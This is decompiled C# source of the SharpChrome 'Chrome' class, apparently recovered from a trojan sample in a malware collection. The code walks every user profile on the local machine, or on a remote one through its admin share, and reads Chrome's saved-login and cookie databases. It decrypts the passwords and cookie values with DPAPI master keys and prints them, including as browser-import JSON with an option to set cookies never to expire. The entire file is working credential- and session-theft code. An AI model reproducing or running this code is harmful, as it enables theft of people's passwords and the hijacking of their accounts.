// Decompiled with JetBrains decompiler
// Type: SharpChrome.Chrome
// Assembly: SharpChrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D938FA4A-3611-4CA7-B3BE-AF9F6D845B7B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\VHO-Trojan.MSIL.Convagent.gen-340a639e1ec7cb2afa90a2aba177b368e13efc4dd1313e32af30b6ceb259f7d3.exe

using SharpDPAPI;
using SQLite;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace SharpChrome
{
  internal class Chrome
  {
    public static void TriageChromeLogins(
      Dictionary<string, string> MasterKeys,
      string computerName = "",
      string displayFormat = "table",
      bool showAll = false,
      bool unprotect = false)
    {
      if (!string.IsNullOrEmpty(computerName) && !Helpers.TestRemote(computerName))
        return;
      if (Helpers.IsHighIntegrity() || !string.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName))
      {
        Console.WriteLine("[*] Triaging Chrome Logins for ALL users\r\n");
        foreach (string directory in Directory.GetDirectories(string.IsNullOrEmpty(computerName) ? string.Format("{0}\\Users\\", (object) Environment.GetEnvironmentVariable("SystemDrive")) : string.Format("\\\\{0}\\C$\\Users\\", (object) computerName)))
        {
          if (!directory.EndsWith("Public") && !directory.EndsWith("Default") && !directory.EndsWith("Default User") && !directory.EndsWith("All Users"))
          {
            string loginDataFilePath = string.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", (object) directory);
            Chrome.ParseChromeLogins(MasterKeys, loginDataFilePath, displayFormat, showAll, unprotect);
          }
        }
      }
      else
      {
        Console.WriteLine("[*] Triaging Chrome Logins for current user\r\n");
        string loginDataFilePath = string.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", (object) Environment.GetEnvironmentVariable("USERPROFILE"));
        Chrome.ParseChromeLogins(MasterKeys, loginDataFilePath, displayFormat, showAll, true);
      }
    }

    public static void TriageChromeCookies(
      Dictionary<string, string> MasterKeys,
      string computerName = "",
      string displayFormat = "csv",
      bool showAll = false,
      bool unprotect = false,
      string cookieRegex = "",
      string urlRegex = "",
      bool setneverexpire = false)
    {
      if (!string.IsNullOrEmpty(computerName) && !Helpers.TestRemote(computerName))
        return;
      if (Helpers.IsHighIntegrity() || !string.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName))
      {
        Console.WriteLine("[*] Triaging Chrome Cookies for ALL users\r\n");
        foreach (string directory in Directory.GetDirectories(string.IsNullOrEmpty(computerName) ? string.Format("{0}\\Users\\", (object) Environment.GetEnvironmentVariable("SystemDrive")) : string.Format("\\\\{0}\\C$\\Users\\", (object) computerName)))
        {
          if (!directory.EndsWith("Public") && !directory.EndsWith("Default") && !directory.EndsWith("Default User") && !directory.EndsWith("All Users"))
          {
            string cookieFilePath = string.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", (object) directory);
            Chrome.ParseChromeCookies(MasterKeys, cookieFilePath, displayFormat, showAll, unprotect, cookieRegex, urlRegex, setneverexpire);
          }
        }
      }
      else
      {
        Console.WriteLine("[*] Triaging Chrome Cookies for current user, using CryptUnprotectData() to decrypt.\r\n");
        string cookieFilePath = string.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", (object) Environment.GetEnvironmentVariable("USERPROFILE"));
        Chrome.ParseChromeCookies(MasterKeys, cookieFilePath, displayFormat, showAll, true, cookieRegex, urlRegex, setneverexpire);
      }
    }

    public static void ParseChromeLogins(
      Dictionary<string, string> MasterKeys,
      string loginDataFilePath,
      string displayFormat = "table",
      bool showAll = false,
      bool unprotect = false)
    {
      if (!File.Exists(loginDataFilePath))
        return;
      string databasePath = string.Format("{0}?nolock=1", (object) new Uri(loginDataFilePath).AbsoluteUri);
      bool flag = false;
      SQLiteConnection sqLiteConnection1;
      try
      {
        sqLiteConnection1 = new SQLiteConnection(databasePath, SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri);
      }
      catch (Exception ex)
      {
        Console.WriteLine("[X] {0}", (object) ex.InnerException.Message);
        return;
      }
      if (!displayFormat.Equals("table") && !displayFormat.Equals("csv"))
      {
        Console.WriteLine("\r\n[X] Invalid format: {0}", (object) displayFormat);
      }
      else
      {
        string str1 = "SELECT signon_realm, origin_url, username_value, password_value, times_used, cast(date_created as text) as date_created FROM logins";
        SQLiteConnection sqLiteConnection2 = sqLiteConnection1;
        string query = str1;
        object[] objArray = new object[1]{ (object) false };
        foreach (SQLiteQueryRow sqLiteQueryRow in sqLiteConnection2.Query2(query, objArray))
        {
          string str2 = Encoding.ASCII.GetString(Dpapi.DescribeDPAPIBlob((byte[]) sqLiteQueryRow.column[3].Value, MasterKeys, "chrome", unprotect));
          DateTime dateTime = Helpers.ConvertToDateTime(sqLiteQueryRow.column[5].Value.ToString());
          if (str2 != string.Empty | showAll)
          {
            if (displayFormat.Equals("table"))
            {
              if (!flag)
                Console.WriteLine("--- Chrome Credential (Path: {0}) ---\r\n", (object) loginDataFilePath);
              flag = true;
              Console.WriteLine("URL       : {0} ({1})", sqLiteQueryRow.column[0].Value, sqLiteQueryRow.column[1].Value);
              Console.WriteLine("Created   : {0}", (object) dateTime);
              Console.WriteLine("TimesUsed : {0}", sqLiteQueryRow.column[4].Value);
              Console.WriteLine("Username  : {0}", sqLiteQueryRow.column[2].Value);
              Console.WriteLine("Password  : {0}", (object) str2);
              Console.WriteLine();
            }
            else
            {
              if (!flag)
              {
                Console.WriteLine("--- Chrome Credential (Path: {0}) ---\r\n", (object) loginDataFilePath);
                Console.WriteLine("file_path,signon_realm,origin_url,date_created,times_used,username,password");
              }
              flag = true;
              Console.WriteLine("{0},{1},{2},{3},{4},{5},{6}", (object) Helpers.StringToCSVCell(loginDataFilePath), (object) Helpers.StringToCSVCell(string.Format("{0}", sqLiteQueryRow.column[0].Value)), (object) Helpers.StringToCSVCell(string.Format("{0}", sqLiteQueryRow.column[1].Value)), (object) Helpers.StringToCSVCell(dateTime.ToString()), (object) Helpers.StringToCSVCell(string.Format("{0}", sqLiteQueryRow.column[5].Value)), (object) Helpers.StringToCSVCell(string.Format("{0}", sqLiteQueryRow.column[2].Value)), (object) Helpers.StringToCSVCell(str2));
            }
          }
        }
        sqLiteConnection1.Close();
      }
    }

    public static void ParseChromeCookies(
      Dictionary<string, string> MasterKeys,
      string cookieFilePath,
      string displayFormat = "table",
      bool showAll = false,
      bool unprotect = false,
      string cookieRegex = "",
      string urlRegex = "",
      bool setneverexpire = false)
    {
      if (!File.Exists(cookieFilePath))
        return;
      string databasePath = string.Format("{0}?nolock=1", (object) new Uri(cookieFilePath).AbsoluteUri);
      bool flag1 = false;
      if (!displayFormat.Equals("table") && !displayFormat.Equals("csv") && !displayFormat.Equals("json"))
      {
        Console.WriteLine("\r\n[X] Invalid format: {0}", (object) displayFormat);
      }
      else
      {
        SQLiteConnection sqLiteConnection;
        try
        {
          sqLiteConnection = new SQLiteConnection(databasePath, SQLiteOpenFlags.ReadOnly | SQLiteOpenFlags.OpenUri);
        }
        catch (Exception ex)
        {
          Console.WriteLine("[X] {0}", (object) ex.InnerException.Message);
          return;
        }
        string query = "SELECT cast(creation_utc as text) as creation_utc, host_key, name, path, cast(expires_utc as text) as expires_utc, cast(last_access_utc as text) as last_access_utc, encrypted_value FROM cookies";
        List<SQLiteQueryRow> sqLiteQueryRowList = sqLiteConnection.Query2(query, (object) false);
        int num1 = 1;
        DateTime dateTime1 = new DateTime(1601, 1, 1);
        long num2 = (long) Math.Abs((DateTime.Now.AddYears(100) - dateTime1).TotalSeconds * 1000000.0);
        foreach (SQLiteQueryRow sqLiteQueryRow in sqLiteQueryRowList)
        {
          try
          {
            string str = Encoding.ASCII.GetString(Dpapi.DescribeDPAPIBlob((byte[]) sqLiteQueryRow.column[6].Value, MasterKeys, "chrome", unprotect));
            DateTime dateTime2 = Helpers.ConvertToDateTime(sqLiteQueryRow.column[0].Value.ToString());
            DateTime dateTime3 = Helpers.ConvertToDateTime(sqLiteQueryRow.column[4].Value.ToString());
            DateTime dateTime4 = Helpers.ConvertToDateTime(sqLiteQueryRow.column[5].Value.ToString());
            bool flag2 = false;
            if (showAll)
              flag2 = true;
            else if (!string.IsNullOrEmpty(cookieRegex))
            {
              if (Regex.Match(sqLiteQueryRow.column[2].Value.ToString(), cookieRegex, RegexOptions.IgnoreCase).Success)
                flag2 = true;
            }
            else if (!string.IsNullOrEmpty(urlRegex))
            {
              if (Regex.Match(sqLiteQueryRow.column[1].Value.ToString(), urlRegex, RegexOptions.IgnoreCase).Success)
                flag2 = true;
            }
            else if (dateTime3 > DateTime.UtcNow)
              flag2 = true;
            if (flag2)
            {
              if (displayFormat.Equals("table"))
              {
                if (!flag1)
                  Console.WriteLine("[*] Chrome 'Cookies' path: {0}\r\n", (object) cookieFilePath);
                flag1 = true;
                Console.WriteLine("Host (path)                : {0} ({1})", sqLiteQueryRow.column[1].Value, sqLiteQueryRow.column[3].Value);
                Console.WriteLine("Cookie Name                : {0}", sqLiteQueryRow.column[2].Value);
                Console.WriteLine("Cookie Value               : {0}", (object) str);
                Console.WriteLine("Created/Expires/LastAccess : {0} / {1} / {2}\r\n", (object) dateTime2, (object) dateTime3, (object) dateTime4);
              }
              else if (displayFormat.Equals("json"))
              {
                if (!flag1)
                  Console.WriteLine("[*] Chrome 'Cookies' path: {0}\r\n\r\nEditThisCookie import JSON:\r\n\r\n[\r\n{{\r\n", (object) cookieFilePath);
                else
                  Console.WriteLine("},\r\n{\r\n");
                flag1 = true;
                Console.WriteLine("    \"domain\": \"{0}\",", (object) Helpers.CleanForJSON(string.Format("{0}", sqLiteQueryRow.column[1].Value)));
                if (setneverexpire)
                  Console.WriteLine("    \"expirationDate\": {0},", (object) num2);
                else
                  Console.WriteLine("    \"expirationDate\": {0},", (object) sqLiteQueryRow.column[4].Value.ToString());
                Console.WriteLine("    \"hostOnly\": false,");
                Console.WriteLine("    \"httpOnly\": false,");
                Console.WriteLine("    \"name\": \"{0}\",", (object) Helpers.CleanForJSON(string.Format("{0}", sqLiteQueryRow.column[2].Value)));
                Console.WriteLine("    \"path\": \"{0}\",", (object) string.Format("{0}", sqLiteQueryRow.column[3].Value));
                Console.WriteLine("    \"sameSite\": \"no_restriction\",");
                Console.WriteLine("    \"secure\": false,");
                Console.WriteLine("    \"session\": false,");
                Console.WriteLine("    \"storeId\": \"0\",");
                Console.WriteLine("    \"value\": \"{0}\",", (object) Helpers.CleanForJSON(str));
                Console.WriteLine("    \"id\": \"{0}\"", (object) num1);
                ++num1;
              }
              else
              {
                if (!flag1)
                {
                  Console.WriteLine("[*] Chrome 'Cookies' path: {0}\r\n", (object) cookieFilePath);
                  Console.WriteLine("file_path,host,path,name,value,creation_utc,expires_utc,last_access_utc");
                }
                flag1 = true;
                Console.WriteLine("{0},{1},{2},{3},{4},{5},{6},{7}", (object) Helpers.StringToCSVCell(cookieFilePath), (object) Helpers.StringToCSVCell(string.Format("{0}", sqLiteQueryRow.column[1].Value)), (object) Helpers.StringToCSVCell(string.Format("{0}", sqLiteQueryRow.column[3].Value)), (object) Helpers.StringToCSVCell(string.Format("{0}", sqLiteQueryRow.column[2].Value)), (object) Helpers.StringToCSVCell(str), (object) Helpers.StringToCSVCell(dateTime2.ToString()), (object) Helpers.StringToCSVCell(dateTime3.ToString()), (object) Helpers.StringToCSVCell(dateTime4.ToString()));
              }
            }
          }
          catch
          {
          }
        }
        if (displayFormat.Equals("json") & flag1)
          Console.WriteLine("}\r\n]\r\n");
        sqLiteConnection.Close();
      }
    }
  }
}
